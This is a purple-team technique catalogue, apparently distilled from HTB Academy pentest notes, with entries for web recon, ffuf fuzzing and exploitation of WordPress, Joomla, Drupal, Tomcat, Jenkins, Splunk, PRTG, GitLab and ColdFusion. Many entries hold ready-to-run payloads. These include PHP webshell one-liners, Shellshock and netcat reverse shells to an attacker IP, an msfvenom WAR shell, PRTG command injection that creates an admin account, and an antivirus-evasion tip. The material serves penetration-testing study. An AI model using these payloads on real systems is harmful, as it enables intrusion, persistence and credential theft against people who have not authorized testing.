# Vault Techniques — Common Applications / Ffuf / Web Recon

Distilled from Obsidian vault (root: `Documents/Purple-Teaming`). Placeholders: `{URL}` = base URL of target app, `{TARGET}` = host/IP.

## TECH: app-discovery-sweep
- vault: HTB-Academy/Pentester Path/Common Applications/01-Application-Discovery-Enumeration.md
- class: auto
- when: starting any external/internal assessment; need full web-app inventory before per-app techniques
- probe: nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
  nmap --open -sV {TARGET}
  eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
  cat web_discovery.xml | ./aquatone -nmap
- detect: nmap service banners on web ports; dev/qa/acc/staging hostnames (untested features, debug mode); vhosts needing /etc/hosts entries; EyeWitness "High Value Targets" — Tomcat (/manager), any CMS, osTicket; printer pages leaking LDAP creds; Splunk/PRTG/Jenkins panels
- sev: low

## TECH: web-fingerprint-suite
- vault: HTB-Academy/Pentester Path/Web Recon/08 - Fingerprinting.md
- class: auto
- when: every web target, first contact; before picking app-specific techniques
- probe: curl -I {URL}
  curl -IL {URL}   # follow redirects — each hop leaks headers
  wafw00f {TARGET}
  nikto -h {URL} -Tuning b   # software-identification modules only
  whatweb {URL}   # large signature DB; Wappalyzer browser ext as alternative
- detect: `Server: Apache/2.4.41 (Ubuntu)` version disclosure; `X-Powered-By` framework; `X-Redirect-By: WordPress`; `Link: ...wp-json/` confirms WordPress; wafw00f names WAF product (e.g. Wordfence) → research product-specific bypasses first; nikto flags outdated server, /license.txt, /wp-login.php, missing HSTS/X-Content-Type-Options, cookie without httponly
- sev: low

## TECH: crawl-reconspider
- vault: HTB-Academy/Pentester Path/Web Recon/09 - Crawling.md
- class: auto
- when: after fingerprinting; map site structure, comments, sensitive files before fuzzing
- probe: curl -s {URL}/robots.txt
  curl -s {URL}/.well-known/openid-configuration
  python3 ReconSpider.py {URL}   # pip3 install scrapy; output → results.json
  # alt crawlers: Burp Suite Spider, OWASP ZAP, Scrapy custom, Apache Nutch
- detect: robots.txt `Disallow:` entries = map of hidden paths (/admin/, /private/, /wp-admin/, /administrator/); `Sitemap:` URL; .well-known/openid-configuration JSON leaks issuer + authorization/token/userinfo endpoints + jwks_uri (full OAuth/OIDC attack surface); ReconSpider results.json: emails, links, js_files, form_fields, comments (devs leak internal info), backup/config files (.bak, web.config, settings.php, error_log)
- sev: low

## TECH: ffuf-vhost-fuzz
- vault: HTB-Academy/Pentester Path/Ffuf/05 - Vhost Fuzzing and Filtering.md
- class: auto
- when: one IP likely hosting multiple sites; subdomain has no DNS record (DNS-based enum useless); common in labs/internal networks
- probe: ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u {URL}/ -H 'Host: FUZZ.academy.htb' -fs 900
  # measure default size first (every bogus Host returns 200 identical), then -fs that size
  sudo sh -c 'echo "{TARGET} admin.academy.htb" >> /etc/hosts'   # verify hit
- detect: every candidate returns same 200/size with bogus Host (default vhost); real vhost = response differing in size from baseline survives -fs filter; verify: paths valid on original vhost now 404 on new vhost → separate site; then re-run recursive dir fuzz against it
- sev: low

## TECH: ffuf-param-fuzz
- vault: HTB-Academy/Pentester Path/Ffuf/06 - Parameter Fuzzing.md
- class: auto
- when: page exists but shows no content / needs no login (e.g. admin.php) → likely expects undocumented parameter; unpublished params are less tested/secured
- probe: ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "{URL}/admin/admin.php?FUZZ=key" -fs xxx
  ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u {URL}/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
  curl {URL}/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'   # confirm
- detect: response size differs from baseline (filter -fs with the known default size); curl confirm returns app-level error like `Invalid id!` → param is real & actively checked (value just wrong → chain value fuzzing); note: PHP $_POST only populates with Content-Type: application/x-www-form-urlencoded; some hits are deprecated params — document, don't assume access
- sev: med

## TECH: ffuf-value-fuzz
- vault: HTB-Academy/Pentester Path/Ffuf/07 - Value Fuzzing.md
- class: auto
- when: parameter name confirmed real (e.g. `id` returns "Invalid id!") and needs valid value; numeric-looking params
- probe: for i in $(seq 1 1000); do echo $i >> ids.txt; done
  ffuf -w ids.txt:FUZZ -u {URL}/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
  curl {URL}/admin/admin.php -X POST -d 'id=<found value>' -H 'Content-Type: application/x-www-form-urlencoded'
- detect: hit whose size differs from "Invalid id!" baseline = working value; custom wordlist needed — premade SecLists rarely cover custom/numeric IDs
- sev: med

## TECH: wordpress-fingerprint
- vault: HTB-Academy/Pentester Path/Common Applications/02-WordPress.md
- class: auto
- when: X-Redirect-By: WordPress / wp-json link / robots.txt referencing /wp-admin/ or /wp-content/uploads/
- probe: curl -s {URL} | grep WordPress   # version via generator meta tag
  curl -s {URL}/ | grep themes
  curl -s {URL}/ | grep plugins
  curl -s {URL}/xmlrpc.php   # XML-RPC enabled check
- detect: `<meta name="generator" content="WordPress x.y">` version; theme/plugin paths in source; wp-content/plugins/*/readme.txt + directory listing → plugin versions; /wp-admin redirects to /wp-login.php; xmlrpc.php POST returns XML-RPC fault → enabled, usable for faster brute force; stats: 89% of WP vulns are plugins, 60% of hacks = outdated core
- sev: low

## TECH: wpscan-enum
- vault: HTB-Academy/Pentester Path/Common Applications/02-WordPress.md
- class: auto
- when: WordPress fingerprint confirmed
- probe: wpscan --url {URL} --enumerate --api-token <WPVulnDB token>
  wpscan --url {URL} --enumerate ap   # all plugins
  # free WPVulnDB token = 25 requests/day, adds PoC/CVE references
- detect: vulnerable/outdated plugins & themes with CVE refs; username list (also manually: /wp-login.php error differs for valid user vs invalid user); media, backups, readme.html exposure, upload dir listing; XML-RPC flagged. Combine with manual grep — WPScan misses plugins manual review catches and vice versa. Check Wayback Machine (waybackurls) for long-removed but still-present vulnerable plugins
- sev: med

## TECH: wordpress-login-bruteforce
- vault: HTB-Academy/Pentester Path/Common Applications/02-WordPress.md
- class: manual
- when: WordPress + valid usernames enumerated (wpscan or login-error oracle)
- probe: sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url {URL}
- detect: valid creds reported; xmlrpc attack mode (via /xmlrpc.php) is faster than wp-login mode; 8% of WP hacks = weak passwords
- sev: high

## TECH: wordpress-theme-editor-rce
- vault: HTB-Academy/Pentester Path/Common Applications/02-WordPress.md
- class: manual
- when: admin-level WordPress credentials obtained (admin ≈ code execution on server)
- probe: # Appearance → Theme Editor → select INACTIVE theme → edit 404.php, add: system($_GET[0]);
  curl "{URL}/wp-content/themes/twentynineteen/404.php?0=id"
  # metasploit alternative: use exploit/unix/webapp/wp_admin_shell_upload (set VHOST for vhost installs)
- detect: command output in response = RCE; use inactive theme to avoid corrupting live site; msf module uploads malicious plugin → Meterpreter but self-cleanup unreliable — document artifacts
- sev: high

## TECH: wordpress-plugin-cves
- vault: HTB-Academy/Pentester Path/Common Applications/02-WordPress.md
- class: manual
- when: wpscan/manual enum shows vulnerable plugin versions (89% of WP vulns live in plugins)
- probe: # mail-masta (unauth LFI/SQLi, 2016):
  curl -s "{URL}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
  # wpDiscuz <= 7.0.4 (CVE-2020-24186 unauth RCE via MIME-check bypass):
  python3 wp_discuz.py -u {URL} -p /?p=1
  curl -s "{URL}/wp-content/uploads/2021/08/<shell>.php?cmd=id"
- detect: /etc/passwd contents = LFI confirmed; uploaded shell executing `id` = RCE
- sev: high

## TECH: joomla-enum
- vault: HTB-Academy/Pentester Path/Common Applications/03-Joomla.md
- class: auto
- when: meta generator "Joomla! - Open Source Content Management" or robots.txt disallowing /administrator/, /components/, /modules/, /plugins/, /cache/, /tmp/
- probe: curl -s {URL}/ | grep Joomla
  curl -s {URL}/README.txt
  curl -s {URL}/administrator/manifests/files/joomla.xml   # precise version e.g. 3.9.4
  curl -s {URL}/plugins/system/cache/cache.xml   # approximate version
  droopescan scan joomla --url {URL}/   # limited Joomla support: version ranges + URLs
  python2 joomlascan.py -u {URL}   # components/directories
- detect: generator meta tag; joomla.xml `<version>` element; README.txt major-version history; JS files under media/system/js/; admin login at /administrator/index.php, default username `admin`
- sev: low

## TECH: joomla-template-rce
- vault: HTB-Academy/Pentester Path/Common Applications/03-Joomla.md
- class: manual
- when: Joomla + valid admin credentials (default user `admin`, password only weak if guessable — failed logins give generic message, no user enum)
- probe: # /administrator login → Configuration → Templates → protostar → Customise → edit error.php, insert: system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
  curl "{URL}/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
  # brute force first if needed: python3 joomla-brute.py -u {URL} -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
  # CVE-2019-10945 (dir traversal + auth file deletion, Joomla 1.5.0–3.9.4): python2.7 joomla_dir_trav.py --url "{URL}/administrator/" --username admin --password admin --dir /
- detect: `id` output = RCE; most Joomla vulns are in third-party extensions (426 CVEs, core RCEs rare); glitch after login "Call to a member function format() on null" → disable Quick Icon PHP Version Check plugin
- sev: high

## TECH: drupal-enum
- vault: HTB-Academy/Pentester Path/Common Applications/04-Drupal.md
- class: auto
- when: meta Generator "Drupal 8", "Powered by Drupal" footer, node-style URLs /node/<id>, robots.txt referencing /node
- probe: curl -s {URL} | grep Drupal
  curl -s {URL}/CHANGELOG.txt | grep -m2 ""   # older installs: exact version e.g. "Drupal 7.57, 2018-02-21"
  droopescan scan drupal -u {URL}
- detect: CHANGELOG.txt first lines = version (newer installs block it); droopescan returns installed modules/plugins, themes, possible version range, interesting URLs (e.g. /user/login); gov/edu heavy (56% of gov sites)
- sev: low

## TECH: drupal-rce-builtin
- vault: HTB-Academy/Pentester Path/Common Applications/04-Drupal.md
- class: manual
- when: Drupal + admin access; no simple file-edit path like WP/Joomla — RCE via PHP filter or module upload
- probe: # Drupal <8: Modules → enable PHP filter → Content → Add Basic page (Text format = PHP code): <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
  # Drupal 8+: manually install php-8.x-1.1.tar.gz from ftp.drupal.org (get client sign-off first)
  # Backdoored module: tar real module + shell.php + .htaccess (RewriteEngine On/REWRITEBASE /) → Extend → + Install new module
  curl "{URL}/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
- detect: command output via node URL or module path = RCE; /modules denies direct access — .htaccess override required
- sev: high

## TECH: drupalgeddon
- vault: HTB-Academy/Pentester Path/Common Applications/04-Drupal.md
- class: manual
- when: Drupal 7.0–7.31 (Drupalgeddon CVE-2014-3704), < 7.58 / < 8.5.1 (Drupalgeddon2 CVE-2018-7600), or authenticated session with node-delete perms (Drupalgeddon3 CVE-2018-7602)
- probe: python2.7 drupalgeddon.py -t {URL} -u hacker -p pwnd   # D1: pre-auth SQLi → creates admin user
  python3 drupalgeddon2.py   # D2: unauth RCE via registration input sanitization flaw; enter target URL interactively
  # D2 webshell payload: echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64 → patch script
  # D3: use exploit/multi/http/drupal_drupageddon3 (set drupal_session SESS...=..., DRUPAL_NODE 1, VHOST)
- detect: D1: new admin user created → login → PHP filter RCE; D2: uploaded file/PoC lands, then mrb3n.php?fe8edb...=id returns command output; D3: Meterpreter session
- sev: high

## TECH: tomcat-manager-enum
- vault: HTB-Academy/Pentester Path/Common Applications/05-Tomcat.md
- class: auto
- when: nmap shows http on 8080/8180; very common internally, top of EyeWitness High Value Targets
- probe: curl -sI {URL}/invalid   # Server header reveals version if custom error pages unset
  curl -s {URL}/docs/ | grep Tomcat   # default docs page often left in place
  gobuster dir -u {URL}/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
  nmap -sV -p 8009,8080 {TARGET}   # 8009 = AJP (Ghostcat candidate)
- detect: `Apache Tomcat/x.y` in Server header or /docs/ title; /manager and /host-manager present (401 = HTTP Basic auth → brute-forceable); roles in tomcat-users.xml: manager-gui (HTML GUI), manager-script (HTTP API), manager-jmx, manager-status; WEB-INF/web.xml = deployment descriptor, high LFI value
- sev: med

## TECH: tomcat-mgr-brute-war-rce
- vault: HTB-Academy/Pentester Path/Common Applications/05-Tomcat.md
- class: manual
- when: /manager/html reachable with HTTP Basic auth; default/weak creds extremely common
- probe: use auxiliary/scanner/http/tomcat_mgr_login   # set stop_on_success true; wordlists tomcat_mgr_default_{users,pass,userpass}.txt
  # manual: python3 mgr_brute.py -U {URL}/ -P /manager -u tomcat_mgr_default_users.txt -p tomcat_mgr_default_pass.txt
  # then WAR deploy: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=4443 -f war > backup.war
  # or zip -r backup.war cmd.jsp (from tennc/webshell fuzzdb-webshell/jsp/cmd.jsp) → manager GUI Browse → Deploy
  curl "{URL}/backup/cmd.jsp?cmd=id"   # hit the JSP directly, not app root
  # also: use exploit/multi/http/tomcat_mgr_upload
- detect: valid manager creds (debug via Burp: set PROXIES HTTP:127.0.0.1:8080, decode base64 Authorization header); deployed WAR executes `id` → RCE; stock cmd.jsp flagged by AV — trivial string change dropped detections 0/58; Undeploy after + record webapps path for report
- sev: high

## TECH: tomcat-ghostcat-ajp-lfi
- vault: HTB-Academy/Pentester Path/Common Applications/05-Tomcat.md
- class: manual
- when: port 8009 (AJP) open AND Tomcat < 9.0.31 / < 8.5.51 / < 7.0.100
- probe: nmap -sV -p 8009,8080 {TARGET}
  python2.7 tomcat-ajp.lfi.py {TARGET} -p 8009 -f WEB-INF/web.xml
- detect: file contents returned via AJP misconfiguration (CVE-2020-1938); limited to files within webapps folder (cannot read /etc/passwd) but WEB-INF/web.xml exposure can leak routes/classes/secrets
- sev: med

## TECH: tomcat-cgi-cmd-injection
- vault: HTB-Academy/Pentester Path/Common Applications/11-Tomcat-CGI-and-Shellshock.md
- class: manual
- when: Windows Tomcat 9.0.0.M1–9.0.17 / 8.5.0–8.5.39 / 7.0.0–7.0.93 with enableCmdLineArguments + CGI servlet
- probe: nmap -p- -sC -Pn {TARGET} --open   # http-title: Apache Tomcat/9.0.17
  ffuf -w /usr/share/dirb/wordlists/common.txt -u {URL}/cgi/FUZZ.cmd
  ffuf -w /usr/share/dirb/wordlists/common.txt -u {URL}/cgi/FUZZ.bat
  # exploit: {URL}/cgi/welcome.bat?&dir  →  ?&set (dump CGI env)  →  ?&c:\windows\system32\whoami.exe
  # if regex filter blocks \ and : → URL-encode: ?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
- detect: ffuf hit e.g. welcome.bat in /cgi/; command output after `&` separator = RCE (CVE-2019-0232); PATH unset in CGI env → must hardcode full binary paths
- sev: high

## TECH: shellshock-cgi
- vault: HTB-Academy/Pentester Path/Common Applications/11-Tomcat-CGI-and-Shellshock.md
- class: manual
- when: any CGI-based app (cgi-bin) on GNU Bash <= 4.3; still found on IoT/embedded old CGI stacks
- probe: gobuster dir -u {URL}/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
  curl -i {URL}/cgi-bin/access.cgi   # even empty 200 response worth testing
  curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' {URL}/cgi-bin/access.cgi
  # reverse shell: curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker IP>/7777 0>&1' {URL}/cgi-bin/access.cgi
  sudo nc -lvnp 7777
- detect: passwd contents or callback = CVE-2014-6271 confirmed; CGI headers (User-Agent) passed into env vars the shell interprets; shell lands as web server user (www-data) → further privesc needed
- sev: high

## TECH: jenkins-script-console-rce
- vault: HTB-Academy/Pentester Path/Common Applications/06-Jenkins.md
- class: manual
- when: Jenkins login page `login?from=%2F` on :8080 (via Tomcat) or :8000; weak/default creds (admin:admin) or no-auth installs common internally; Windows Jenkins often runs as SYSTEM
- probe: curl -s {URL}/script   # Script Console presence = Groovy execution surface
  # if accessible, run Groovy: def cmd = 'id'; def sout = new StringBuffer(), serr = new StringBuffer(); def proc = cmd.execute(); proc.consumeProcessOutput(sout, serr); proc.waitForOrKill(1000); println sout
  # Windows: def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
- detect: /script reachable (valid creds or no auth) → arbitrary Groovy = built-in webshell; command output returned; reverse shell via Runtime.exec /bin/bash /dev/tcp; port 5000 = master-slave agent traffic; CVE chains: CVE-2018-1999002 + CVE-2019-1003000 pre-auth RCE vs Jenkins 2.137; Jenkins 2.150.2 anonymous JOB create+build → code exec
- sev: high

## TECH: splunk-fingerprint
- vault: HTB-Academy/Pentester Path/Common Applications/07-Splunk.md
- class: auto
- when: nmap shows 8000 + 8089 ssl/http Splunkd httpd; common internally in large corps
- probe: sudo nmap -sV {TARGET}   # 8000 web UI, 8089 management/REST API
  curl -s {URL}/   # login page: older versions show default creds admin:changeme right on page
- detect: Splunkd httpd banners; old default creds `admin:changeme`; newer installs — try admin/Welcome/Welcome1/Password123; CRITICAL: Enterprise trial auto-converts to Splunk Free after 60 days with NO authentication — forgotten trials are wide open; few exploitable CVEs (CVE-2018-11409 info disclosure, CVE-2011-4642 auth RCE, REST API SSRF) — built-in abuse is the real path
- sev: high

## TECH: splunk-custom-app-rce
- vault: HTB-Academy/Pentester Path/Common Applications/07-Splunk.md
- class: manual
- when: Splunk web UI access with admin (or no-auth Free instance)
- probe: # build app: splunk_shell/bin/rev.py (python rev shell) + splunk_shell/default/inputs.conf:
  # [script://./bin/rev.py] / disabled = 0 / interval = 10 / sourcetype = shell
  tar -cvzf updater.tar.gz splunk_shell/
  sudo nc -lnvp 443
  # web UI: Manage Apps → Install app from file → upload tarball (auto-enables scripted input immediately)
- detect: callback shell, typically NT AUTHORITY\SYSTEM (Windows) or root (Linux) — Splunk runs privileged; every install ships Python so .py payloads are cross-platform (use run.bat→PowerShell for Windows-heavy estates); if host is a deployment server, drop app in $SPLUNK_HOME/etc/deployment-apps to push RCE to all Universal Forwarder hosts
- sev: high

## TECH: prtg-fingerprint
- vault: HTB-Academy/Pentester Path/Common Applications/08-PRTG-Network-Monitor.md
- class: auto
- when: nmap `Indy httpd ... (Paessler PRTG bandwidth monitor)` on 80/443/8080; common internally (HTB Netmon)
- probe: sudo nmap -sV -p- --open -T4 {TARGET}
  curl -s {URL}/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
- detect: PRTG banner/version; login form often pre-filled with default creds `prtgadmin:prtgadmin` (EyeWitness flags automatically); 26 CVEs, only 1 easy public PoC RCE-class: authenticated command injection
- sev: med

## TECH: prtg-cmd-injection
- vault: HTB-Academy/Pentester Path/Common Applications/08-PRTG-Network-Monitor.md
- class: manual
- when: PRTG before 18.2.39 + valid login (default prtgadmin:prtgadmin)
- probe: # Setup → Account Settings → Notifications → Add notification → tick EXECUTE PROGRAM
  # Program File: Demo exe notification - outfile.ps1
  # Parameter: test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
  # Save → click Test ("EXE notification is queued up")
  sudo crackmapexec smb {TARGET} -u prtgadm1 -p 'Pwn3d_by_PRTG!'   # blind — confirm via SMB
- detect: CVE-2018-9276 — Parameter field passed unsanitized into PowerShell script; execution is blind (no direct feedback) → confirm new local admin via CMB/evil-winrm/wmiexec; notifications schedulable daily = persistence
- sev: high

## TECH: osticket-email-harvest
- vault: HTB-Academy/Pentester Path/Common Applications/09-osTicket.md
- class: manual
- when: OSTSESSID cookie, "powered by osTicket" footer; real value is workflow abuse, not CVEs (CVE-2020-24881 SSRF in 1.14.1 minor)
- probe: # submit ticket at {URL}/open.php → osTicket issues valid company email like 940288@inlanefreight.local
  # use it to self-register on email-verified services (Slack/Mattermost/Rocket.Chat/GitLab) — replies readable in ticket portal
  # with leaked creds try agent login {URL}/scp/login.php (accepts email as username) → mine closed tickets for reset-password workflow failures + default new-joiner passwords → spray other portals
- detect: valid @company.local address issued; verification emails arriving in ticket thread; agent queue exposes standard passwords/address book for user enumeration (HTB Delivery chain)
- sev: med

## TECH: gitlab-enum
- vault: HTB-Academy/Pentester Path/Common Applications/10-GitLab.md
- class: auto
- when: GitLab logo on /users/sign_in login page (often :8081)
- probe: curl -s {URL}/users/sign_in
  curl -s {URL}/explore   # public projects without auth — hunt hardcoded creds, secrets, SSH keys
  curl -s {URL}/users/sign_up   # self-registration if enabled → immediate internal-project access
  ./gitlab_userenum.sh --url {URL}/ --userlist users.txt   # "Email has already been taken" leak even when sign-up disabled
- detect: sign_in page = GitLab; /explore lists public repos; /help shows version ONLY when logged in — avoid blind exploit firing without version; user/email enumeration valid despite GitLab not treating it as a vuln; lockout: <16.6 defaults 10 failed attempts → 10-min lockout (mind when spraying)
- sev: med

## TECH: gitlab-exiftool-rce
- vault: HTB-Academy/Pentester Path/Common Applications/10-GitLab.md
- class: manual
- when: GitLab CE <= 13.10.2 + valid credentials (self-registration makes trivial if enabled)
- probe: python3 gitlab_13_10_2_rce.py -t {URL} -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker IP> 8443 >/tmp/f'
- detect: reverse shell as `git` user — ExifTool metadata parsing flaw in uploaded images; 553 GitLab CVEs total, several severe RCEs
- sev: high

## TECH: coldfusion-fingerprint
- vault: HTB-Academy/Pentester Path/Common Applications/13-ColdFusion.md
- class: auto
- when: port 8500 open ( giveaway), .cfm/.cfc extensions, Server/X-Powered-By: ColdFusion headers
- probe: nmap -p- -sC -Pn {TARGET} --open   # 8500/tcp open fmtp
  curl -sI {URL}/CFIDE/administrator/index.cfm   # version-specific admin login page
  searchsploit adobe coldfusion
- detect: 8500 = CF SSL service; /CFIDE + /cfdocs often browsable; admin login page reveals major version (e.g. ColdFusion 8); other ports: 5500 Server Monitor, 1935 RPC
- sev: med

## TECH: coldfusion-traversal-rce
- vault: HTB-Academy/Pentester Path/Common Applications/13-ColdFusion.md
- class: manual
- when: ColdFusion <= 9.0.1 (CVE-2010-2861 traversal) or <= 8.0.1 (CVE-2009-2265 unauth RCE via FCKeditor)
- probe: # traversal via locale param on admin endpoints (mappings.cfm, logging/settings.cfm, datasources/index.cfm, j2eepackaging/editarchive.cfm, enter.cfm):
  curl "{URL}:8500/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd"
  python2 14641.py {TARGET} 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
  # unauth upload RCE: {URL}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
  # exploit: searchsploit -p 50057; python3 50057.py   (set lhost/lport/rhost/rport)
- detect: passwd or password.properties content = CVE-2010-2861 (password.properties holds encrypted DB/mail/LDAP creds); JSP payload + auto reverse shell = CVE-2009-2265
- sev: high

## TECH: iis-tilde-enum
- vault: HTB-Academy/Pentester Path/Common Applications/14-IIS-Tilde-Enumeration.md
- class: auto
- when: nmap `Microsoft IIS httpd` (any version) — legacy 8.3 short-name handling
- probe: nmap -p- -sV -sC --open {TARGET}   # confirm IIS + version
  java -jar iis_shortname_scanner.jar 0 5 {URL}/
  # manual concept: brute ~a, ~b... after / ; 200 at ~s → extend ~se, ~sec... → secret~1
  # recover full name: egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
  gobuster dir -u {URL}/ -w /tmp/list.txt -x .aspx,.asp
- detect: "Result: Vulnerable!" + identified short names (e.g. ASPNET~1, TRANSF~1.ASP) = hidden files/dirs leaked even when direct GET blocked; then brute full filename with targeted wordlist
- sev: med

## TECH: ldap-injection
- vault: HTB-Academy/Pentester Path/Common Applications/15-LDAP-and-LDAP-Injection.md
- class: manual
- when: web app + LDAP backend (port 389/636 OpenLDAP/AD in nmap); login filter pattern `(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))`
- probe: # auth bypass — try literal wildcards in login form:
  username: *  password: *
  # variants: username=* password=dummy (any user w/ known pw) or username=dummy password=* (known user, any pw)
  ldapsearch -H ldap://{TARGET}:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
- detect: successful login with zero valid credentials = filter injection (wildcards `*`, `()`, `|`, `&` change filter logic); metafilter chars: * wildcard, () grouping, | OR, & AND
- sev: high

## TECH: mass-assignment
- vault: HTB-Academy/Pentester Path/Common Applications/16-Web-Mass-Assignment.md
- class: manual
- when: registration/app form says "Account is pending approval" or app has hidden privilege fields (admin, confirmed, role) not exposed in UI
- probe: # intercept POST /register in Burp, append hidden field to body:
  username=new&password=test&confirmed=test
  curl {URL}/register -X POST -d 'username=new&password=test&confirmed=test'
  # JSON equivalent: {"user":{"username":"hacker","email":"hacker@example.com","admin":true}}
- detect: instant login with new:test = approval workflow bypassed; server blindly reads request.form['confirmed'] presence (any truthy value) → mass-assigns to DB column; frameworks: Rails attr_accessible bypass, any framework binding raw form/JSON to model
- sev: high
